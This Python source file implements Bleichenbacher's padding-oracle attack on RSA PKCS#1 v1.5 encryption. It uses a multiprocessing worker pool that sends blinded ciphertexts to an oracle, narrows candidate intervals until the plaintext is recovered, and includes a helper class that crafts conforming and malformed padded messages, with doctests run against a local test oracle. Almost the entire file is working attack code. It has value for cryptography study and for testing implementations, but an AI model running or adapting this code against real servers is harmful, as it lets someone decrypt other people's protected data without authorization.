from __future__ import with_statement
import logging
import multiprocessing as mp
import random
import signal
import threading as th
from oracle import Oracle
from Crypto.PublicKey import RSA
from utils import NumUtils

class RSAOracleWorker(mp.Process):

  def __init__(self, oracle, callback, tasks_queue, results_queue, *args, **kwargs):
    mp.Process.__init__(self)
    if tasks_queue == None or results_queue == None:
      raise ValueError("Task or result queue cannot be None")
    self.tasks_queue = tasks_queue
    self.results_queue = results_queue
    self.oracle = oracle
    self.callback = callback
    self.n = args[0]
    self.e = args[1]

  class RSATask(object):

    def __init__(self, task):
      """ Parses an incoming task into an RSATask
      Task must be a tuple containing (task_id, c, s, i)
      >>> task = (1,2,3)
      >>> rsa_task = RSAOracleWorker.RSATask(task)
      Traceback (most recent call last):
      ValueError: Task must contain 4 fields
      >>> task = (1, "123456789a", 1234, 8)
      >>> rsa_task = RSAOracleWorker.RSATask(task)
      >>> rsa_task.task_id
      1
      >>> rsa_task.c == 0x123456789a
      True
      >>> rsa_task.s
      1234
      >>> rsa_task.i
      8
      """
      if len(task) != 4:
        raise ValueError("Task must contain 4 fields")
      self.task_id = task[0]
      self.c = NumUtils.to_int_error(task[1], "Ciphertext")
      self.s = task[2]
      self.i = task[3]
      signal.signal(signal.SIGINT, signal.SIG_IGN)

  def __parse_task(self, task):
    """ Returns a task as an RSATask object
    >>> o = Oracle()
    >>> def callback(*args):
    ...   return True
    >>> inq, outq = mp.Queue(), mp.Queue()
    >>> worker = RSAOracleWorker(o, callback, inq, outq, 123456, 0x10001)
    >>> worker._RSAOracleWorker__parse_task((1,2,3,4,5)) == None
    True
    >>> worker._RSAOracleWorker__parse_task((1,2,3,4)) # doctest: +ELLIPSIS
    <....RSATask object ...
    >>> inq.close()
    >>> outq.close()
    """
    try:
      new_task = RSAOracleWorker.RSATask(task)
    except ValueError:
      new_task = None
    return new_task
  
  def run(self):
    """
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["args", "%0256x"])
    >>> def callback(*args):
    ...   return True
    >>> inq, outq = mp.Queue(), mp.Queue()
    >>> worker = RSAOracleWorker(o, callback, inq, outq, 123456, 0x10001)
    >>> worker.start()
    >>> inq.put((123, 1, 2, 3))
    >>> outq.get()
    (123, True, 2, 3)
    >>> inq.put((1, 2, 3))
    >>> inq.put((124, 5, 6, 7))
    >>> outq.get()
    (124, True, 6, 7)
    >>> inq.put((None))
    >>> worker.join()
    >>> worker.is_alive()
    False
    >>> inq.close()
    >>> outq.close()
    """
    while True:
      task = self.tasks_queue.get()
      if task == (None):
        break
      else:
        rsa_task = self.__parse_task(task)
        if rsa_task != None:
          c_prime = (rsa_task.c * (rsa_task.s**self.e)) % self.n
          oracle_result = self.oracle.query(c_prime, self.callback)
          if oracle_result == True:
            result = (rsa_task.task_id, oracle_result, rsa_task.s, rsa_task.i)
            self.results_queue.put(result)

class Bleichenbacher(object):

  __POISON_PILL = (None)

  def __init__(self, n, oracle, callback, e=0x10001, pool_size=mp.cpu_count()):
    """Builds an object to compute the Bleichenbacher attack
    >>> def callback(*args):
    ...   pass
    >>> b = Bleichenbacher(1234123412341234, None, callback)
    Traceback (most recent call last):
    ValueError: Padding oracle must extend the Oracle base class
    >>> o = Oracle()
    >>> b = Bleichenbacher(1234123412341234, o, None)
    Traceback (most recent call last):
    ValueError: Callback must be a function evaluating oracle output
    >>> b = Bleichenbacher(1234123412341234, o, callback)
    >>> b.n
    1234123412341234
    >>> b.k
    64
    >>> hex(b.B2)[:3] == "0x2"
    True
    >>> hex(b.B3 - 1)[:5] == "0x2ff"
    True
    """
    self.n = NumUtils.to_int_error(n, "Modulus")
    bits_needed = NumUtils.bytes_to_hold(self.n) * 8
    self.k = NumUtils.pow2_round(bits_needed)
    self.e = NumUtils.to_int_error(e, "Exponent")
    self.B = 2**(self.k - 16)
    self.B2 = 2*self.B
    self.B3 = 3*self.B
    self.M0 = set([(self.B2, self.B3 - 1)])
    self.s_min_start = NumUtils.ceil_int(n, self.B3)
    self.s_search_running = False
    self.found_solution = False
    self.__logger = logging.getLogger(__name__)
    if isinstance(oracle, Oracle):
      self.oracle = oracle
    else:
      raise ValueError("Padding oracle must extend the Oracle base class")
    if callable(callback):
      self.callback = callback
    else:
      raise ValueError("Callback must be a function evaluating oracle output")
    if pool_size <= 0:
      raise ValueError("Number of threads in the pool must be strictly positive")
    self.__pool_size = pool_size
    self.__logger.info("Bleichenbacher attack initialized with:")
    self.__logger.info("\tModulus: %i" % self.n)
    self.__logger.info("\tPublic exponent: %i" % self.e)
    self.__logger.info("\tKey size (in bits): %i" % self.k)
    self.__logger.info("\tOracle type: %s" % self.oracle.__class__.__name__)

  @classmethod
  def pubkey_from_file(cls, key_file, oracle, callback):
    """Imports modulus and exponent information from a pem key file
    >>> def callback(*args):
    ...   pass
    >>> o = Oracle()
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/256.pub", o, callback)
    >>> b.n
    93363501535823485560286011140434660057766656356767952260224292233143073609873L
    >>> b.k
    256
    """
    with open(key_file, 'r') as kf:
      key_pair = RSA.importKey(kf.read())
    b = cls(key_pair.n, oracle, callback, key_pair.e)
    return b

  def __worker_pool_init(self, pool_size, task_queue_size=100, result_queue_size=1):
    self.__task_queue = mp.Queue(task_queue_size)
    self.__result_queue = mp.Queue(result_queue_size)
    self.__worker_pool = [RSAOracleWorker(self.oracle, self.callback, self.__task_queue, self.__result_queue, self.n, self.e)
                        for _ in xrange(pool_size)]
    self.__logger.info("Created %i workers in the processing pool" % (pool_size))

  def __worker_pool_start(self):
    for p in self.__worker_pool:
      p.start()
    self.__logger.info("Started all worker threads in the pool")
    self.__worker_pool_running = True

  def __worker_pool_stop(self):
    for p in self.__worker_pool:
      self.__task_queue.put(Bleichenbacher.__POISON_PILL)
      p.terminate()
      p.join(2)
    self.__logger.info("Stopped all worker threads in the pool")
    self.__worker_pool_running = False

  def __result_thread_stop(self):
    self.__result_queue.put(Bleichenbacher.__POISON_PILL)
    self.__result_worker.join(2)
    self.__logger.info("Stopped result polling thread")

  def __submit_pool_task(self, task):
    self.__logger.debug("Sending task %i to processing pool:" % (task[0]))
    self.__logger.debug("\tIteration %i in task %i" % (task[3], task[0]))
    self.__logger.debug("\tS value: %i" % task[2])
    self.__task_queue.put(task)

  def __narrow_interval(self, s, M):
    R = self.__get_r_values(s, M)
    M = self.__get_search_intervals(R, s, M)
    self.__logger.debug("Calculated interval value:")
    self.__logger.debug("\tInterval start: %i" % list(M)[0][0])
    self.__logger.debug("\tInterval end: %i" % list(M)[0][1])
    self.__logger.debug("\tInterval size: %i" % (list(M)[0][1] - list(M)[0][0]))
    return M

  def stop_search(self):
    self.__worker_pool_stop()
    self.__result_thread_stop()
    self.__task_queue.close()
    self.__result_queue.close()

  def run_search(self, c):
    M = self.M0
    s_min = self.s_min_start
    s_max = None
    c = NumUtils.to_int_error(c, "Ciphertext")
    
    self.__task_id = 0
    self.__worker_pool_running = False
    self.__worker_pool_init(self.__pool_size)
    self.__worker_pool_start()
    self.__result_worker = th.Thread(target=self.__get_task_results)
    self.__result_worker.start()
    
    self.__logger.info("Starting search for:")
    self.__logger.info("\tCiphertext: %i" % c)
    self.__logger.info("\tAt start value: %i" % s_min)
    
    #s_min, i = 42298, 1
    s_min, i = self.s_search(c, s_min, s_max)

    self.__logger.info("Found PKCS1 conforming message in %i iterations for s value: %i" % (i, s_min))

    while not self.found_solution:
      a = list(M)[0][0]
      b = list(M)[0][1]
      if len(M) != 1:
        M = self.__narrow_interval(s_min, M)
        s_min, i = self.s_search(c, s_min, s_max)
      else:
        if a == b:
          self.found_solution = True
          self.__logger.info("Found cleartext solution:")
          self.__logger.info("\tCiphertext: %i => %x" % (c, c))
          self.__logger.info("\tFinal interval: %i => %x" % (a, a))
          self.__logger.info("\tCleartext: %i => %x" % (a % self.n, a % self.n))
        else:
          if s_min != None:
            M = self.__narrow_interval(s_min, M)
            it = self.__converge_s_interval(s_min, M)
          (s_min, s_max) = it.next()
          s_min, i = self.s_search(c, s_min, s_max)
    self.stop_search()
    return a, a % self.n

  def __get_task_results(self):
    res = []
    while True:
      result = self.__result_queue.get()
      res.append(result)
      self.__logger.debug("Result for task: ")
      self.__logger.debug("\tFound in iteration %i of task: %i" % (result[3], result[0]))
      self.__logger.debug("\tS value: %i" % result[2])
      if result == Bleichenbacher.__POISON_PILL:
        break
      self.__s = result[2] 
      self.__i = result[3]
      self.s_search_running = False

  def s_search(self, c, s_min, s_max=None):
    """
    >>> def callback(*args):
    ...   return True if rc != 2 else False
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> b.s_search("1234abcdh", 0)
    Traceback (most recent call last):
    ValueError: Ciphertext must be an integer
    >>> # ./rsa_test_client.py 1024.pub $(python -c 'print "000201020304050607080900" + "41"*116')
    >>> b.s_search("6c1d38dbcb5c0ab72324618ce93f646c842aa7029920722c14570a0d856219f778620850c57c69dc0e41923c8696d8494c846f8f2bf4f0e8d5ce4c865c624f438a70f927b77aa72628fd05bd5d7853d0d859f27b95428c9d6d16fab1ef46509051fdceb97ee0f8192e91115bc29a703278b7a95a22b90ecd5c8015d019e35b8e", b.s_min_start) # doctest: +SKIP
    (42298L, 28172)
    """
    c = NumUtils.to_int_error(c, "Ciphertext")
    s = s_min
    i = 1

    self.s_search_running = True
    self.__task_id += 1
    self.__s = None
    self.__i = None
    while self.s_search_running:
      # Multiprocessor searching can be done when there is no upper boundary
      if s_max == None:
        self.__submit_pool_task((self.__task_id, c, s, i))
      # Otherwise fallback to linear searching
      # TODO: Improve by rescaling the pool
      else:
        if s > s_max:
          self.s_search_running = False
        else: 
          c_prime = (c * (s**self.e)) % self.n
          if self.oracle.query(c_prime, self.callback):
            self.__s = s
            self.__i = i
            self.s_search_running = False
      i += 1
      s += 1
    return self.__s, self.__i

  def __get_r_values(self, s, intervals):
    """returns the values of r for a given s/interval couple
    >>> def callback(*args):
    ...   pass
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> # Calling private method through name mangling. Not sure how to test with doctest otherwise
    >>> b._Bleichenbacher__get_r_values(42298L, set([(1, 2, 3)]))
    Traceback (most recent call last):
    ValueError: An interval must contain 2 values only
    >>> b._Bleichenbacher__get_r_values(42298L, set([(2, 1)]))
    Traceback (most recent call last):
    ValueError: The interval upper boundary must be superior to the lower boundary
    >>> b._Bleichenbacher__get_r_values(42298L, set([(b.B2, b.B3 - 1)]))
    [2]
    """
    R = []
    for interval in intervals:
      if len(interval) != 2:
        raise ValueError("An interval must contain 2 values only")
      a = interval[0]
      b = interval[1]
      if (a > b):
        raise ValueError("The interval upper boundary must be superior to the lower boundary")
      r_min = NumUtils.ceil_int((a * s - self.B3 + 1), self.n)
      r_max = NumUtils.floor_int((b * s - self.B2), self.n)
      R.extend([r for r in range(r_min, r_max + 1)])
    return R

  def __get_search_intervals(self, R, s, M):
    """
    >>> def callback(*args):
    ...   pass
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> M = b._Bleichenbacher__get_search_intervals([2, 3], 42298L, set([(b.B2, b.B3 - 1), (b.B2, b.B3 - 1)]))
    >>> M
    set([(5496887481649310677312273406003793183582777148242941892439949450277737071001138376320592327946554069347948926815933108973166742899056823715751318121381743085331656870604607768325297130993447946417262236480484519794268058017772040064446757490222074521854458697349586588761691894067915139519429990011640015L, 5496952332517777196872101955063455427770091848614542586705282468410845683670552529152252987737791673523011734569554295224428563294629460065553947372217695679665899795786657865330646504370413665056732678493596987993653272377244460842840420225558265257305452366702707014190670121644559497925100005725173178L)])
    >>> print("%0256x" % list(M)[0][0])
    000201012793fa30b688fb61e3fb077f95292e18c6fbd530b5ae1ed552e9091206fd2dbddccd9299c7d28884ec3d6877cbb4add7e4bf91a656934cfda649e641e02c94b3eda5bf28ad9265036a1d5f01894b244dc4d96cbebec0bed9209feacdbffe812db5eaa25c708a58fd656c79b26bbc86a87f62d11e9d2ac541948018cf
    """
    new_M = set([])
    for (a, b) in M:
      for r in R:
        new_a = max(a, NumUtils.ceil_int(self.B2 + r * self.n, s))
        new_b = min(b, NumUtils.floor_int(self.B3 - 1 + r * self.n, s))
        if new_a <= new_b and (new_a, new_b) not in new_M:
            new_M |= set([(new_a, new_b)])
    return new_M

  def __converge_s_interval(self, s, M):
    """Once a single interval remains, converge towards the final value of a.
    >>> def callback(*args):
    ...   pass
    >>> o = ExecOracle("./pkcs1_test_oracle.py", ["keypairs/1024.priv", "%0256x"])
    >>> b = Bleichenbacher.pubkey_from_file("keypairs/1024.pub", o, callback)
    >>> M = set([(5496887481649310677312273406003793183582777148242941892439949450277737071001138376320592327946554069347948926815933108973166742899056823715751318121381743085331656870604607768325297130993447946417262236480484519794268058017772040064446757490222074521854458697349586588761691894067915139519429990011640015L, 5496952332517777196872101955063455427770091848614542586705282468410845683670552529152252987737791673523011734569554295224428563294629460065553947372217695679665899795786657865330646504370413665056732678493596987993653272377244460842840420225558265257305452366702707014190670121644559497925100005725173178L)])
    >>> s = 42298
    >>> it = b._Bleichenbacher__converge_s_interval(s, M)
    >>> it.next()
    (84595L, 84595L)
    >>> it.next()
    (105743L, 105744L)
    """
    if len(M) != 1:
      raise ValueError("M must contain only one interval")
    a = list(M)[0][0]
    b = list(M)[0][1]
    r = NumUtils.floor_int(2 * (b * s - self.B2), self.n)
    while True:
      s_min = NumUtils.ceil_int(self.B2 + r * self.n, b)
      s_max = NumUtils.floor_int(self.B3 + r * self.n, a)
      r += 1
      yield (s_min, s_max)

class PKCS1_v15(object):

  HEADER = "\x00\x02"
  DELIMITER = "\x00"
  MIN_PAD_LEN = 8
  MIN_LEN = len(HEADER) + MIN_PAD_LEN + len(DELIMITER)
  FUNC_TABLE = {1:"conforming_message",
                2:"conforming_consecutive_null_bytes",
                3:"non_conforming_message_header",
                4:"non_conforming_padding_length",
                5:"non_conforming_no_delimiter"
                }

  def __init__(self, key_length):
    """
    >>> pad = PKCS1_v15(-1)
    Traceback (most recent call last):
    ValueError: Key length cannot be negative or null
    >>> pad = PKCS1_v15(500)
    >>> pad.k == 512 / 8
    True
    """
    if key_length <= 0:
      raise ValueError("Key length cannot be negative or null")
    self.k = NumUtils.pow2_round(key_length) / 8

  def get_random_padding(self, length):
    r""" Generates a random string of bytes with no null-bytes
    >>> pad = PKCS1_v15(256)
    >>> random_bytes = pad.get_random_padding(100)
    >>> "\x00" in random_bytes
    False
    """
    return self.__get_random_bytes(length, ["\x00"])

  def conforming_message(self, data):
    r""" Creates a PKCS1 conforming message
    >>> pad = PKCS1_v15(128)
    >>> m = pad.conforming_message("123456")
    Traceback (most recent call last):
    ValueError: Cleartext too long to be conforming: max => 5 bytes, provided => 6 bytes
    >>> m = pad.conforming_message("12345")
    >>> m.startswith("\x00\x02")
    True
    >>> "\x00" not in m[2:10]
    True
    >>> "\x00" in m[10:]
    True
    >>> m[-6] == "\x00"
    True
    >>> m[-5:] == "12345"
    True
    """
    padding_len = self.k - len(data) - len(PKCS1_v15.HEADER) - len(PKCS1_v15.DELIMITER)
    if padding_len < PKCS1_v15.MIN_PAD_LEN:
      raise ValueError("Cleartext too long to be conforming: max => %i bytes, provided => %i bytes" % (self.k - PKCS1_v15.MIN_LEN, len(data)))
    random_padding = self.get_random_padding(padding_len)
    return PKCS1_v15.HEADER + random_padding + PKCS1_v15.DELIMITER + data

  def conforming_consecutive_null_bytes(self, data, index=-1, extra_nulls=2, pad_back=True):
    r""" Creates a message with a consecutive set of "extra_nulls" null-bytes padding backwards from position "index"
    if "pad_back" is true.
    >>> pad = PKCS1_v15(256)
    >>> m = pad.conforming_consecutive_null_bytes("123456", 10)  
    >>> m[7:9] == "\x00"*2
    True
    >>> m = pad.conforming_consecutive_null_bytes("123456", 14, 4, False)
    >>> m[14: 14 + 4] == "\x00"*4
    True
    """
    padded_m = self.conforming_message(data)
    if index == -1:
      index = padded_m.index("\x00", 1) + 1
    if pad_back == True:
      index -= (extra_nulls + 1)
    if index < 0 or index + extra_nulls >= self.k:
      raise IndexError("Cannot pad null bytes passed data boundary")
    return padded_m[:index] + "\x00"*extra_nulls + padded_m[index + extra_nulls:]

  def non_conforming_message_header(self, data, header="\x00\x01"):
    r""" Creates a message starting with "header". Used to create non-conforming PKCS1 header
    >>> pad = PKCS1_v15(256)
    >>> m = pad.non_conforming_message_header("123456", "\x00\x03\x04")
    >>> m.startswith("\x00\x03\x04")
    True
    """
    return header + self.conforming_message(data)[len(header):]

  def non_conforming_padding_length(self, data, byte_index=4):
    r""" Creates a message which contains a null-byte at position inside the 8 byte mandatory PKCS1 padding
    >>> pad = PKCS1_v15(256)
    >>> m = pad.non_conforming_padding_length("123456", 2)
    >>> m[3] == "\x00"
    True
    """
    padded_m = self.conforming_message(data)
    abs_pos = len(PKCS1_v15.HEADER) + byte_index - 1
    return padded_m[:abs_pos] + "\x00" + padded_m[abs_pos + 1:]

  def non_conforming_no_delimiter(self, data, replacement="\xff"):
    r""" Creates a message which contains no null-byte delimiter
    >>> pad = PKCS1_v15(256)
    >>> m = pad.non_conforming_no_delimiter("123456")
    >>> "\x00" in m[1:]
    False
    """
    padded_m = self.conforming_message(data)
    null_index = padded_m.index("\x00", 1)
    return padded_m[:null_index] + replacement + padded_m[null_index + 1:]

  def __get_random_bytes(self, length, excluded=[]):
    r""" Generates a random string of bytes, excluding the explicitely denied characters
    >>> pad = PKCS1_v15(256)
    >>> random_bytes = pad._PKCS1_v15__get_random_bytes(100, ["\x00", "\x20"])
    >>> "\x00" in random_bytes
    False
    >>> "\x20" in random_bytes
    False
    """
    random_gen = random.Random()
    random_bytes = ""
    while (len(random_bytes) != length):
      # counter-intuitive: max boundary 0xff included
      random_byte = chr(random_gen.randint(0x0, 0xff))
      if random_byte not in excluded:
        random_bytes += random_byte
    return random_bytes

if __name__ == "__main__":
  import doctest
  doctest.testmod()
